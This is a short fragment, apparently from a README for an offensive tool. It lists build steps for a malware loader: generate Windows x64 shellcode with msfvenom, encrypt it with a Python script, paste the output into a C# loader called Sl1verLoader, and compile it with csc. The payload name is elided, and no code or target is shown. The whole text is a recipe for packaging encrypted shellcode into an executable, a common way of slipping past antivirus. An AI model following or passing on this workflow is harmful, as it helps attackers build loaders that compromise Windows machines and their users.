**Workflow:**

msfvenom -p windows/x64/... -f raw -o sc.bin 

→ encryptor.py sc.bin 

→ paste payload.cs into the loader 

→ compile with csc Sl1verLoader.cs (or include payload.cs as a second file).
